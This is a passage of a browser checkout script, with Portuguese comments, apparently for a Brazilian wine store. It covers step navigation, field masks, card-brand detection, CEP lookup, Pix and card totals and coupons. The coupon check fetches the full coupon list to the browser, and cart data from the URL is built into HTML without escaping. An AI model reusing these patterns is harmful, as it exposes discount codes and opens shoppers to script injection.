    if (summaryPhone) summaryPhone.textContent = phoneVal || '-';
    
    // Step 2: Enviar para
    const cepVal = document.getElementById('cep').value.trim();
    const streetVal = document.getElementById('street').value.trim();
    const numberVal = document.getElementById('street_number').value.trim();
    const complementVal = document.getElementById('complement').value.trim();
    const neighborhoodVal = document.getElementById('neighborhood').value.trim();
    const cityVal = document.getElementById('city').value.trim();
    const stateVal = document.getElementById('state').value;
    
    const summaryAddress = document.getElementById('summary-val-address');
    const summaryCityCep = document.getElementById('summary-val-city-cep');
    const summaryShipping = document.getElementById('summary-val-shipping');
    
    if (summaryAddress) {
      summaryAddress.textContent = `${streetVal}, ${numberVal}${complementVal ? ', ' + complementVal : ''}`;
    }
    if (summaryCityCep) {
      summaryCityCep.textContent = `${neighborhoodVal}, ${cityVal} - ${stateVal} | CEP: ${cepVal}`;
    }
    
    // Obter descrição do frete selecionado
    const selectedRadio = document.querySelector('input[name="shipping_method"]:checked');
    if (selectedRadio && summaryShipping) {
      const parentOption = selectedRadio.closest('.shipping-option');
      const titleSpan = parentOption ? parentOption.querySelector('.option-title') : null;
      const priceSpan = parentOption ? parentOption.querySelector('.option-price') : null;
      if (titleSpan && priceSpan) {
        summaryShipping.textContent = `${titleSpan.textContent} - ${priceSpan.textContent}`;
      }
    }
  }

  // Ouvinte de clique global para botões de editar etapa ("Editar" no resumo compacto)
  document.addEventListener('click', (e) => {
    const editBtn = e.target.closest('.btn-edit-step');
    if (editBtn) {
      e.preventDefault();
      const stepNum = parseInt(editBtn.getAttribute('data-edit-step'));
      const section = document.querySelector(`.checkout-section[data-step="${stepNum}"]`);
      if (section) {
        // Ativar a seção clicada e remover conclusão
        sections.forEach(s => s.classList.remove('active'));
        section.classList.add('active');
        section.classList.remove('completed');
        
        // Atualiza a barra de progresso superior
        updateTopProgressBar();
      }
    }
  });

  // Avançar etapas clicando no botão "Continuar"
  const nextButtons = document.querySelectorAll('.next-step');
  nextButtons.forEach(btn => {
    btn.addEventListener('click', async (e) => {
      e.preventDefault();
      const currentSection = btn.closest('.checkout-section');
      const currentStepIndex = parseInt(currentSection.getAttribute('data-step'));
      
      // Valida os campos da seção atual antes de prosseguir
      if (validateSectionInputs(currentSection)) {
        // Atualiza os resumos compactos com os novos dados
        updateCompletedSummaries();

        currentSection.classList.remove('active');
        currentSection.classList.add('completed');
        
        const nextSection = document.querySelector(`.checkout-section[data-step="${currentStepIndex + 1}"]`);
        if (nextSection) {
          nextSection.classList.add('active');
        }
        
        // Atualiza a barra de progresso superior
        updateTopProgressBar();

        // --- Rastreamento do Funil & Salvamento de Rascunhos ---
        let subtotal = parseFloat(amountInput.value) || 0;
        let shippingPrice = 15.00;
        const selectedRadio = document.querySelector('input[name="shipping_method"]:checked');
        if (selectedRadio) {
          const priceSpan = selectedRadio.closest('.shipping-option').querySelector('.option-price');
          shippingPrice = parseFloat(priceSpan.getAttribute('data-price')) || 0;
        }
        const totalAmount = subtotal + shippingPrice;

        if (currentStepIndex === 1) {
          // Salvamento do primeiro rascunho de carrinho abandonado
          await saveCheckoutDraft('dados_pessoais');
          trackPixelEvent('InitiateCheckout', {
            content_name: shpfyProductTitle || 'Pacote Sandbox Elite',
            currency: 'BRL',
            value: totalAmount
          });
        } 
        else if (currentStepIndex === 2) {
          // Atualiza rascunho com o endereço e frete
          await saveCheckoutDraft('entrega');
          trackPixelEvent('AddPaymentInfo', {
            content_name: shpfyProductTitle || 'Pacote Sandbox Elite',
            currency: 'BRL',
            value: totalAmount
          });
          // Salva automaticamente o passo de pagamento visto que o passo 3 acaba de ser aberto
          await saveCheckoutDraft('pagamento');
        }
      }
    });
  });

  // Voltar etapas clicando no botão "Voltar"
  const prevButtons = document.querySelectorAll('.prev-step');
  prevButtons.forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      const currentSection = btn.closest('.checkout-section');
      const currentStepIndex = parseInt(currentSection.getAttribute('data-step'));
      
      currentSection.classList.remove('active');
      
      const prevSection = document.querySelector(`.checkout-section[data-step="${currentStepIndex - 1}"]`);
      if (prevSection) {
        prevSection.classList.add('active');
        prevSection.classList.remove('completed');
      }
      
      // Atualiza a barra de progresso superior
      updateTopProgressBar();
    });
  });

  // Clicar nos cabeçalhos para navegar entre etapas concluídas
  sections.forEach(section => {
    const header = section.querySelector('.section-header');
    header.addEventListener('click', () => {
      const isCompleted = section.classList.contains('completed');
      const isActive = section.classList.contains('active');
      
      if (isCompleted || isActive) {
        // Remove a classe ativa de todos
        sections.forEach(s => s.classList.remove('active'));
        // Ativa a seção clicada
        section.classList.add('active');
        section.classList.remove('completed');
        
        // Atualiza a barra de progresso superior
        updateTopProgressBar();
      }
    });
  });

  // Validador de campos por seção
  function validateSectionInputs(section) {
    const inputs = section.querySelectorAll('input[required], select[required]');
    let isValid = true;
    
    // Ignorar campos de cartão se o método Pix estiver selecionado
    const selectedMethod = document.getElementById('selected-payment-method').value;

    inputs.forEach(input => {
      const wrapper = input.closest('.input-wrapper');
      
      // Remover estilos anteriores de erro
      if (wrapper) wrapper.classList.remove('input-error');
      
      // Se for Pix, ignoramos os campos de cartão no passo 3
      if (selectedMethod === 'pix' && section.getAttribute('data-step') === '3') {
        if (['card_number', 'card_holder', 'card_expiry', 'card_cvv', 'card_holder_cpf'].includes(input.id)) {
          return;
        }
      }

      if (!input.value.trim() || (input.tagName === 'SELECT' && input.value === '')) {
        isValid = false;
        if (wrapper) {
          wrapper.classList.add('input-error');
          shakeElement(wrapper);
        }
      }
      
      // Validações de formato específico
      if (input.id === 'customer_email' && input.value.trim()) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(input.value)) {
          isValid = false;
          if (wrapper) {
            wrapper.classList.add('input-error');
            shakeElement(wrapper);
          }
        }
      }
      
      if (input.id === 'customer_cpf' && input.value.trim()) {
        const cleanCPF = input.value.replace(/\D/g, '');
        if (cleanCPF.length !== 11) {
          isValid = false;
          if (wrapper) {
            wrapper.classList.add('input-error');
            shakeElement(wrapper);
          }
        }
      }

      if (input.id === 'cep' && input.value.trim()) {
        const cleanCEP = input.value.replace(/\D/g, '');
        if (cleanCEP.length !== 8) {
          isValid = false;
          if (wrapper) {
            wrapper.classList.add('input-error');
            shakeElement(wrapper);
          }
        }
      }

      if (input.id === 'card_expiry' && input.value.trim() && selectedMethod === 'card') {
        const value = input.value.trim();
        const parts = value.split('/');
        let isExpiryValid = true;
        
        if (parts.length === 2) {
          const month = parseInt(parts[0], 10);
          const year = parseInt(parts[1], 10);
          
          if (isNaN(month) || isNaN(year) || month < 1 || month > 12 || year < 26) {
            isExpiryValid = false;
          }
        } else {
          isExpiryValid = false;
        }

        if (!isExpiryValid) {
          isValid = false;
          if (wrapper) {
            wrapper.classList.add('input-error');
            shakeElement(wrapper);
          }
          const errorMsg = document.getElementById('expiry-error-message');
          if (errorMsg) {
            errorMsg.classList.remove('hide');
          }
        } else {
          const errorMsg = document.getElementById('expiry-error-message');
          if (errorMsg) {
            errorMsg.classList.add('hide');
          }
        }
      }
    });

    // Validar valor mínimo de R$ 5,00 para Pix
    if (selectedMethod === 'pix' && section.getAttribute('data-step') === '3') {
      const subtotal = parseFloat(amountInput.value) || 0;
      let shippingPrice = 15.00;
      const selectedRadio = document.querySelector('input[name="shipping_method"]:checked');
      if (selectedRadio) {
        const priceSpan = selectedRadio.closest('.shipping-option').querySelector('.option-price');
        shippingPrice = parseFloat(priceSpan.getAttribute('data-price')) || 0;
      }
      const totalAmount = subtotal + shippingPrice;

      if (totalAmount < 5.00) {
        isValid = false;
        const summaryBox = document.querySelector('.order-summary-box');
        shakeElement(summaryBox);
        
        alert('⚠️ Valor mínimo do Pix permitido pela PagueX é R$ 5,00. Por favor, aumente o valor do pacote no resumo da compra para testar o Pix.');
      }
    }
    
    return isValid;
  }

  // Efeito de tremer campo com erro
  function shakeElement(element) {
    element.style.animation = 'none';
    setTimeout(() => {
      element.style.animation = 'shake 0.4s ease';
    }, 10);
  }

  // ==========================================
  // 2. ALTERNÂNCIA DE ACORDEÃO DE PAGAMENTO (CARTÃO / PIX)
  // ==========================================
  const paymentMethodInput = document.getElementById('selected-payment-method');
  const virtualCardViewer = document.getElementById('virtual-card');
  const pixVirtualViewer = document.getElementById('pix-virtual-viewer');
  const submitBtnElement = document.getElementById('btn-submit-checkout');

  function switchPaymentMethod(method, immediate = false) {
    if (!method) method = 'pix';
    
    // Atualizar input oculto
    if (paymentMethodInput) {
      paymentMethodInput.value = method;
    }

    // Elementos do cartão para gerenciamento de required
    const cardNum = document.getElementById('card_number');
    const cardName = document.getElementById('card_holder');
    const cardExp = document.getElementById('card_expiry');
    const cardCvv = document.getElementById('card_cvv');
    const cardCpf = document.getElementById('card_holder_cpf');

    // Pegar as caixas de opções
    const optionBoxPix = document.getElementById('option-box-pix');
    const optionBoxCard = document.getElementById('option-box-card');

    // Pegar os rádios
    const radioPix = document.getElementById('payment-method-pix');
    const radioCard = document.getElementById('payment-method-card');

    if (method === 'card') {
      if (optionBoxPix) optionBoxPix.classList.remove('active');
      if (optionBoxCard) optionBoxCard.classList.add('active');
      if (radioPix) radioPix.checked = false;
      if (radioCard) radioCard.checked = true;

      // Ativar card virtual se houver
      if (virtualCardViewer) virtualCardViewer.classList.add('active');
      if (pixVirtualViewer) pixVirtualViewer.classList.remove('active');

      // Requerer campos do cartão
      if (cardNum) cardNum.setAttribute('required', '');
      if (cardName) cardName.setAttribute('required', '');
      if (cardExp) cardExp.setAttribute('required', '');
      if (cardCvv) cardCvv.setAttribute('required', '');
      if (cardCpf) cardCpf.setAttribute('required', '');

      // Mover botão de submit para o cartão
      const cardAnchor = document.getElementById('card-btn-anchor');
      if (submitBtnElement && cardAnchor) {
        cardAnchor.appendChild(submitBtnElement);
      }
    } else {
      if (optionBoxPix) optionBoxPix.classList.add('active');
      if (optionBoxCard) optionBoxCard.classList.remove('active');
      if (radioPix) radioPix.checked = true;
      if (radioCard) radioCard.checked = false;

      // Desativar card virtual
      if (virtualCardViewer) virtualCardViewer.classList.remove('active');
      if (pixVirtualViewer) pixVirtualViewer.classList.add('active');

      // Remover obrigatoriedade dos campos de cartão
      if (cardNum) cardNum.removeAttribute('required');
      if (cardName) cardName.removeAttribute('required');
      if (cardExp) cardExp.removeAttribute('required');
      if (cardCvv) cardCvv.removeAttribute('required');
      if (cardCpf) cardCpf.removeAttribute('required');

      // Mover botão de submit para o Pix
      const pixAnchor = document.getElementById('pix-btn-anchor');
      if (submitBtnElement && pixAnchor) {
        pixAnchor.appendChild(submitBtnElement);
      }
    }

    // Recalcular totais para aplicar/remover desconto do Pix
    if (typeof calculateTotals === 'function') {
      calculateTotals();
    }
  }

  // Vincular eventos nas caixas do accordion e botões de rádio
  const optionBoxPix = document.getElementById('option-box-pix');
  const optionBoxCard = document.getElementById('option-box-card');

  if (optionBoxPix) {
    optionBoxPix.addEventListener('click', (e) => {
      if (e.target.closest('.payment-option-body')) return;
      switchPaymentMethod('pix');
    });
  }

  if (optionBoxCard) {
    optionBoxCard.addEventListener('click', (e) => {
      if (e.target.closest('.payment-option-body')) return;
      switchPaymentMethod('card');
    });
  }

  const radioPix = document.getElementById('payment-method-pix');
  const radioCard = document.getElementById('payment-method-card');
  if (radioPix) {
    radioPix.addEventListener('change', () => {
      if (radioPix.checked) switchPaymentMethod('pix');
    });
  }
  if (radioCard) {
    radioCard.addEventListener('change', () => {
      if (radioCard.checked) switchPaymentMethod('card');
    });
  }

  // ==========================================
  // 3. MÁSCARAS DE ENTRADA (MASCARAMENTO)
  // ==========================================
  const phoneInput = document.getElementById('customer_phone');
  const cpfInput = document.getElementById('customer_cpf');
  const cepInput = document.getElementById('cep');
  const cardInput = document.getElementById('card_number');
  const cardExpiryInput = document.getElementById('card_expiry');
  const cardCvvInput = document.getElementById('card_cvv');

  // Máscara Celular: (XX) XXXXX-XXXX
  if (phoneInput) {
    phoneInput.addEventListener('input', () => {
      let value = phoneInput.value.replace(/\D/g, '');
      if (value.length > 11) value = value.slice(0, 11);
      
      if (value.length > 6) {
        phoneInput.value = `(${value.slice(0, 2)}) ${value.slice(2, 7)}-${value.slice(7)}`;
      } else if (value.length > 2) {
        phoneInput.value = `(${value.slice(0, 2)}) ${value.slice(2)}`;
      } else if (value.length > 0) {
        phoneInput.value = `(${value}`;
      } else {
        phoneInput.value = '';
      }
    });
  }

  // Máscara CPF: XXX.XXX.XXX-XX
  if (cpfInput) {
    cpfInput.addEventListener('input', () => {
      let value = cpfInput.value.replace(/\D/g, '');
      if (value.length > 11) value = value.slice(0, 11);
      
      if (value.length > 9) {
        cpfInput.value = `${value.slice(0, 3)}.${value.slice(3, 6)}.${value.slice(6, 9)}-${value.slice(9)}`;
      } else if (value.length > 6) {
        cpfInput.value = `${value.slice(0, 3)}.${value.slice(3, 6)}.${value.slice(6)}`;
      } else if (value.length > 3) {
        cpfInput.value = `${value.slice(0, 3)}.${value.slice(3)}`;
      } else {
        cpfInput.value = value;
      }
    });
  }

  // Máscara CEP: XXXXX-XXX
  if (cepInput) {
    cepInput.addEventListener('input', () => {
      let value = cepInput.value.replace(/\D/g, '');
      if (value.length > 8) value = value.slice(0, 8);
      
      if (value.length > 5) {
        cepInput.value = `${value.slice(0, 5)}-${value.slice(5)}`;
      } else {
        cepInput.value = value;
      }

      // Se preencheu os 8 dígitos, dispara busca automática do CEP
      if (value.length === 8) {
        buscarCEP(value);
      }
    });
  }

  // Listeners para Cidade e UF manuais e preview de CEP
  const cityInput = document.getElementById('city');
  const stateInput = document.getElementById('state');
  if (cityInput && stateInput) {
    cityInput.addEventListener('input', updateCepPreview);
    stateInput.addEventListener('input', updateCepPreview);
  }
  
  // Sincronizar o preview no carregamento da página
  setTimeout(updateCepPreview, 200);

  // Máscara Cartão de Crédito: XXXX XXXX XXXX XXXX
  if (cardInput) {
    cardInput.addEventListener('input', () => {
      let value = cardInput.value.replace(/\D/g, '');
      if (value.length > 16) value = value.slice(0, 16);
      
      const parts = [];
      for (let i = 0; i < value.length; i += 4) {
        parts.push(value.slice(i, i + 4));
      }
      
      cardInput.value = parts.join(' ');
      updateVirtualCardNumber(cardInput.value);
      detectCardBrand(value);
    });
  }

  // Máscara Validade Cartão: MM/AA
  if (cardExpiryInput) {
    cardExpiryInput.addEventListener('input', () => {
      let value = cardExpiryInput.value.replace(/\D/g, '');
      if (value.length > 4) value = value.slice(0, 4);

      if (value.length > 2) {
        const month = parseInt(value.slice(0, 2));
        const validMonth = (month > 12) ? '12' : value.slice(0, 2);
        cardExpiryInput.value = `${validMonth}/${value.slice(2)}`;
      } else {
        cardExpiryInput.value = value;
      }

      const viewValue = cardExpiryInput.value || 'MM/AA';
      const viewEl = document.getElementById('card-expiry-view');
      if (viewEl) viewEl.textContent = viewValue;

      // Resetar estilos de erro ao digitar
      const errorMsg = document.getElementById('expiry-error-message');
      if (errorMsg) errorMsg.classList.add('hide');
      const wrapper = cardExpiryInput.closest('.input-wrapper');
      if (wrapper) wrapper.classList.remove('input-error');
    });
  }

  // Máscara CVV
  if (cardCvvInput) {
    cardCvvInput.addEventListener('input', () => {
      let value = cardCvvInput.value.replace(/\D/g, '');
      if (value.length > 4) value = value.slice(0, 4);
      cardCvvInput.value = value;

      const viewEl = document.getElementById('card-cvv-view');
      if (viewEl) viewEl.textContent = value || '•••';
    });
  }

  // Máscara CPF do Titular do Cartão: XXX.XXX.XXX-XX
  const cardHolderCpfInput = document.getElementById('card_holder_cpf');
  if (cardHolderCpfInput) {
    cardHolderCpfInput.addEventListener('input', () => {
      let value = cardHolderCpfInput.value.replace(/\D/g, '');
      if (value.length > 11) value = value.slice(0, 11);
      
      if (value.length > 9) {
        cardHolderCpfInput.value = `${value.slice(0, 3)}.${value.slice(3, 6)}.${value.slice(6, 9)}-${value.slice(9)}`;
      } else if (value.length > 6) {
        cardHolderCpfInput.value = `${value.slice(0, 3)}.${value.slice(3, 6)}.${value.slice(6)}`;
      } else if (value.length > 3) {
        cardHolderCpfInput.value = `${value.slice(0, 3)}.${value.slice(3)}`;
      } else {
        cardHolderCpfInput.value = value;
      }
    });
  }

  // Nome do Titular
  const cardHolderInput = document.getElementById('card_holder');
  if (cardHolderInput) {
    cardHolderInput.addEventListener('input', () => {
      let value = cardHolderInput.value.toUpperCase();
      value = value.replace(/[^A-Z\s]/g, '');
      cardHolderInput.value = value;
      
      const viewEl = document.getElementById('card-holder-view');
      if (viewEl) viewEl.textContent = value || 'NOME COMPLETO';
    });
  }

  // ==========================================
  // 4. EFEITO DE ROTAÇÃO 3D DO CARTÃO
  // ==========================================
  const virtualCard = document.getElementById('virtual-card');

  if (virtualCard && cardCvvInput) {
    cardCvvInput.addEventListener('focus', () => {
      virtualCard.classList.add('flip');
    });

    cardCvvInput.addEventListener('blur', () => {
      virtualCard.classList.remove('flip');
    });
  }

  // ==========================================
  // 5. DETECÇÃO DE BANDEIRA DE CARTÃO
  // ==========================================
  const brandIcons = {
    visa: '<i class="fa-brands fa-cc-visa" style="color: #2563eb"></i>',
    mastercard: '<i class="fa-brands fa-cc-mastercard" style="color: #ea580c"></i>',
    amex: '<i class="fa-brands fa-cc-amex" style="color: #0d9488"></i>',
    diners: '<i class="fa-brands fa-cc-diners-club" style="color: #0284c7"></i>',
    discover: '<i class="fa-brands fa-cc-discover" style="color: #f97316"></i>',
    jcb: '<i class="fa-brands fa-cc-jcb" style="color: #ef4444"></i>',
    elo: '<span style="font-weight:900;font-style:italic;color:#eab308;font-size:16px;">ELO</span>',
    generic: '<i class="fa-solid fa-credit-card"></i>'
  };

  let detectedBrand = null;

  function detectCardBrand(number) {
    const brandBadge = document.getElementById('card-brand-badge');
    const logoView = document.getElementById('card-logo-view');
    
    if (number.length === 0) {
      if (brandBadge) {
        brandBadge.innerHTML = brandIcons.generic;
        brandBadge.classList.remove('detected');
      }
      if (logoView) {
        logoView.innerHTML = brandIcons.generic;
      }
      detectedBrand = null;
      return;
    }

    const regexList = {
      visa: /^4/,
      mastercard: /^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[0-1]|2720)/,
      amex: /^3[47]/,
      diners: /^3(0[0-5]|[68])/,
      discover: /^6(011|5)/,
      jcb: /^(352[89]|35[3-8])/,
      elo: /^(40117[8-9]|431274|438935|451416|457393|45763[1-2]|504175|506699|509048|509067|509074|627780|636297|636368)/
    };

    let brand = 'generic';
    for (const [key, regex] of Object.entries(regexList)) {
      if (regex.test(number)) {
        brand = key;
        break;
      }
    }

    detectedBrand = brand === 'generic' ? null : brand;

    if (brandBadge) {
      brandBadge.innerHTML = brandIcons[brand];
      if (brand !== 'generic') {
        brandBadge.classList.add('detected');
      } else {
        brandBadge.classList.remove('detected');
      }
    }
    if (logoView) {
      logoView.innerHTML = brandIcons[brand];
    }
  }

  function updateVirtualCardNumber(formattedNumber) {
    const view = document.getElementById('card-number-view');
    if (!view) return;
    if (!formattedNumber) {
      view.textContent = '•••• •••• •••• ••••';
      return;
    }
    
    let digits = formattedNumber.replace(/\s/g, '');
    let padded = digits.padEnd(16, '•');
    
    const parts = [];
    for (let i = 0; i < 16; i += 4) {
      parts.push(padded.slice(i, i + 4));
    }
    
    view.textContent = parts.join(' ');
  }

  // Função para atualizar o preview de cidade/estado sob o CEP
  function updateCepPreview() {
    const cityEl = document.getElementById('city');
    const stateEl = document.getElementById('state');
    const previewEl = document.getElementById('cep-city-state-preview');
    const wrapperEl = document.getElementById('city-state-inputs-wrapper');
    
    if (cityEl && stateEl && previewEl && wrapperEl) {
      if (cityEl.value.trim() && stateEl.value.trim()) {
        previewEl.textContent = `${stateEl.value.trim().toUpperCase()}/${cityEl.value.trim()}`;
        previewEl.style.display = 'block';
        wrapperEl.style.display = 'none';
      } else {
        previewEl.style.display = 'none';
        wrapperEl.style.display = 'block';
      }
    }
  }

  // ==========================================
  // 6. CONSULTA CEP AUTOMÁTICA (VIACEP)
  // ==========================================
  async function buscarCEP(cep) {
    const cepLoader = document.getElementById('cep-loader');
    const street = document.getElementById('street');
    const neighborhood = document.getElementById('neighborhood');
    const city = document.getElementById('city');
    const state = document.getElementById('state');
    const number = document.getElementById('street_number');

    cepLoader.classList.add('show');

    try {
      const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      if (!response.ok) throw new Error('Falha na rede');
      
      const data = await response.json();
      
      if (data.erro) {
        const inputWrapper = cepInput.closest('.input-wrapper');
        if (inputWrapper) {
          inputWrapper.classList.add('input-error');
          shakeElement(inputWrapper);
        }
        // Se der erro, exibimos os campos manuais de cidade/uf
        const wrapperEl = document.getElementById('city-state-inputs-wrapper');
        const previewEl = document.getElementById('cep-city-state-preview');
        if (wrapperEl) wrapperEl.style.display = 'block';
        if (previewEl) previewEl.style.display = 'none';
      } else {
        street.value = data.logradouro || '';
        neighborhood.value = data.bairro || '';
        city.value = data.localidade || '';
        state.value = data.uf || '';
        
        // Atualizar preview dinâmico
        updateCepPreview();
        
        setTimeout(() => number.focus(), 150);
      }
    } catch (error) {
      console.error('Erro ao consultar CEP:', error);
      // Se falhar a requisição, garante que os inputs fiquem visíveis para fallback manual
      const wrapperEl = document.getElementById('city-state-inputs-wrapper');
      if (wrapperEl) wrapperEl.style.display = 'block';
    } finally {
      cepLoader.classList.remove('show');
    }
  }

  // ==========================================
  // 7. CÁLCULO DE VALORES E FRETE
  // ==========================================
  const amountInput = document.getElementById('base-amount');
  const shippingRadios = document.getElementsByName('shipping_method');
  const subtotalView = document.getElementById('summary-subtotal');
  const shippingView = document.getElementById('summary-shipping');
  const totalView = document.getElementById('summary-total');

  function updateInstallments(totalPrice) {
    const select = document.getElementById('card_installments');
    if (!select) return;
    
    const currentVal = select.value;
    select.innerHTML = '';
    
    for (let i = 1; i <= 12; i++) {
      const partPrice = (totalPrice / i).toFixed(2);
      const formattedPart = parseFloat(partPrice).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
      const option = document.createElement('option');
      option.value = i.toString();
      option.textContent = `${i}x de ${formattedPart} Sem juros`;
      select.appendChild(option);
    }
    
    if (currentVal && select.querySelector(`option[value="${currentVal}"]`)) {
      select.value = currentVal;
    }
  }

  function calculateTotals() {
    let subtotal = parseFloat(amountInput.value) || 0;
    if (subtotal < 0) subtotal = 0;
    
    let shippingPrice = 15.00;
    let selectedRadio = document.querySelector('input[name="shipping_method"]:checked');
    if (selectedRadio) {
      const priceSpan = selectedRadio.closest('.shipping-option').querySelector('.option-price');
      shippingPrice = parseFloat(priceSpan.getAttribute('data-price')) || 0;
    }

    // Calcular Desconto do Cupom se houver ativo
    let couponDiscountVal = 0;
    const couponRow = document.getElementById('summary-coupon-row');
    const couponCodeSpan = document.getElementById('summary-coupon-code');
    const couponValueSpan = document.getElementById('summary-coupon-value');

    if (activeCoupon) {
      const { discount_type, discount_value } = activeCoupon;
      if (discount_type === 'percentage') {
        couponDiscountVal = parseFloat((subtotal * (discount_value / 100)).toFixed(2));
      } else if (discount_type === 'fixed') {
        couponDiscountVal = parseFloat(discount_value);
      }
      
      // O desconto do cupom não pode ultrapassar o subtotal
      if (couponDiscountVal > subtotal) {
        couponDiscountVal = subtotal;
      }

      if (couponCodeSpan) couponCodeSpan.textContent = activeCoupon.code;
      if (couponValueSpan) couponValueSpan.textContent = `-${couponDiscountVal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}`;
      if (couponRow) couponRow.classList.remove('hide');
    } else {
      if (couponRow) couponRow.classList.add('hide');
    }

    // Subtotal pós-cupom para fins de desconto Pix e total
    let subtotalAfterCoupon = subtotal - couponDiscountVal;
    if (subtotalAfterCoupon < 0) subtotalAfterCoupon = 0;

    let discountVal = 0;
    const selectedMethod = document.getElementById('selected-payment-method').value;
    const discountRow = document.getElementById('summary-discount-row');
    const discountPercentSpan = document.getElementById('summary-discount-percent');
    const discountValueSpan = document.getElementById('summary-discount-value');

    if (selectedMethod === 'pix' && discountPixPercent > 0) {
      discountVal = parseFloat((subtotalAfterCoupon * (discountPixPercent / 100)).toFixed(2));
      if (discountPercentSpan) discountPercentSpan.textContent = discountPixPercent;
      if (discountValueSpan) discountValueSpan.textContent = `-${discountVal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}`;
      if (discountRow) discountRow.classList.remove('hide');
    } else {
      if (discountRow) discountRow.classList.add('hide');
    }

    const total = parseFloat((subtotalAfterCoupon + shippingPrice - discountVal).toFixed(2));

    subtotalView.textContent = subtotal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    shippingView.textContent = shippingPrice.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    totalView.textContent = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });

    // Atualizar visualizador de resumo Pix simplificado
    const pixDiscountBadgeText = document.getElementById('pix-discount-badge-text');
    const pixTotalToPay = document.getElementById('pix-total-to-pay');
    const pixEconomyText = document.getElementById('pix-economy-text');

    if (pixDiscountBadgeText) {
      pixDiscountBadgeText.textContent = `${discountPixPercent}% de desconto`;
    }
    if (pixTotalToPay) {
      pixTotalToPay.textContent = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    }
    const pixValueAmount = document.getElementById('pix-value-amount');
    if (pixValueAmount) {
      pixValueAmount.textContent = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    }
    if (pixEconomyText) {
      if (discountVal > 0) {
        pixEconomyText.textContent = `Desconto Pix aplicado: economia de ${discountVal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}.`;
        pixEconomyText.style.display = 'block';
      } else {
        pixEconomyText.style.display = 'none';
      }
    }

    // Atualizar valor total na barra de toggle mobile
    const mobileSummaryTotalVal = document.getElementById('mobile-summary-total-val');
    if (mobileSummaryTotalVal) {
      mobileSummaryTotalVal.textContent = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    }

    // Gerar parcelas do cartão dinamicamente de acordo com o total calculado
    updateInstallments(total);
  }

  amountInput.addEventListener('input', calculateTotals);
  shippingRadios.forEach(radio => {
    radio.addEventListener('change', (e) => {
      document.querySelectorAll('.shipping-option').forEach(el => el.classList.remove('active'));
      e.target.closest('.shipping-option').classList.add('active');
      calculateTotals();
      updateCompletedSummaries();
    });
  });

  // Lógica para aplicar e validar cupom de desconto
  const btnApplyCoupon = document.getElementById('btn-apply-coupon');
  const couponCodeInput = document.getElementById('coupon-code-input');
  const couponMessage = document.getElementById('coupon-message');

  if (btnApplyCoupon && couponCodeInput && couponMessage) {
    btnApplyCoupon.addEventListener('click', async () => {
      const code = couponCodeInput.value.trim().toUpperCase();
      if (!code) {
        couponMessage.textContent = 'Por favor, digite um cupom.';
        couponMessage.className = 'coupon-message error';
        couponMessage.style.display = 'block';
        return;
      }

      btnApplyCoupon.disabled = true;
      btnApplyCoupon.textContent = '...';

      try {
        const response = await fetch('/api/marketing?type=coupon');
        if (!response.ok) throw new Error('Falha ao buscar cupons.');

        const coupons = await response.json();
        const found = coupons.find(c => c.key.trim().toUpperCase() === code);

        if (found) {
          let parsedVal = null;
          try {
            parsedVal = typeof found.value === 'string' ? JSON.parse(found.value) : found.value;
          } catch (e) {
            console.error('Erro ao ler JSON de cupom:', e);
          }

          if (parsedVal && parsedVal.active !== false) {
            activeCoupon = {
              id: found.id,
              code: found.key.toUpperCase(),
              discount_type: parsedVal.discount_type || 'percentage',
              discount_value: parseFloat(parsedVal.discount_value) || 0
            };

            couponMessage.textContent = 'Cupom aplicado com sucesso!';
            couponMessage.className = 'coupon-message success';
            couponMessage.style.display = 'block';

            calculateTotals();
          } else {
            throw new Error('Cupom inativo.');
          }
        } else {
          throw new Error('Cupom inválido.');
        }
      } catch (err) {
        activeCoupon = null;
        couponMessage.textContent = 'Cupom inválido ou expirado.';
        couponMessage.className = 'coupon-message error';
        couponMessage.style.display = 'block';
        calculateTotals();
      } finally {
        btnApplyCoupon.disabled = false;
        btnApplyCoupon.textContent = 'Aplicar';
      }
    });
  }

  // Globais para rastreamento de produto Shopify
  let shpfyProductTitle = null;
  let shpfyProductSku = null;
  let shpfyProductPrice = null;
  let shpfyProductQuantity = 1;
  let shpfyVariantId = null;
  let shopifyCartItems = []; // Global variable to store all products in the Shopify cart

  // Função para carregar produtos vindos do redirecionamento Shopify
  function parseUrlParameters() {
    const urlParams = new URLSearchParams(window.location.search);
    const paramTitle = urlParams.get('title');
    const paramPrice = urlParams.get('price');
    const paramSku = urlParams.get('sku');
    const paramQty = urlParams.get('quantity');
    const paramVariant = urlParams.get('shopify_variant_id');
    const paramProductId = urlParams.get('shopify_product_id') || urlParams.get('product_id');
    const cartParam = urlParams.get('cart');

    if (cartParam) {
      try {
        shopifyCartItems = JSON.parse(decodeURIComponent(cartParam));
        console.log("🛒 Lista de produtos carregada do carrinho Shopify:", shopifyCartItems);
      } catch (e) {
        console.error("Erro ao fazer o parse do carrinho Shopify:", e);
      }
    }

    if (shopifyCartItems && shopifyCartItems.length > 0) {
      // Usar a lista completa de produtos do carrinho Shopify
      const itemsListContainer = document.getElementById('items-list');
      if (itemsListContainer) {
        let htmlContent = '';
        let totalBaseAmount = 0;

        shopifyCartItems.forEach((item) => {
          const priceNum = parseFloat(item.price) || 0;
          const qtyNum = parseInt(item.quantity) || 1;
          const subtotalItem = priceNum * qtyNum;
          totalBaseAmount += subtotalItem;

          // Se tiver imagem exibe ela, senão exibe ícone de garrafa de vinho (já que é Porto dos Vinhos!)
          const imageHtml = item.image 
            ? `<img src="${item.image}" alt="${item.title}" style="width: 100%; height: 100%; object-fit: cover;">` 
            : `<i class="fa-solid fa-wine-bottle" style="font-size: 1.25rem;"></i>`;

          htmlContent += `
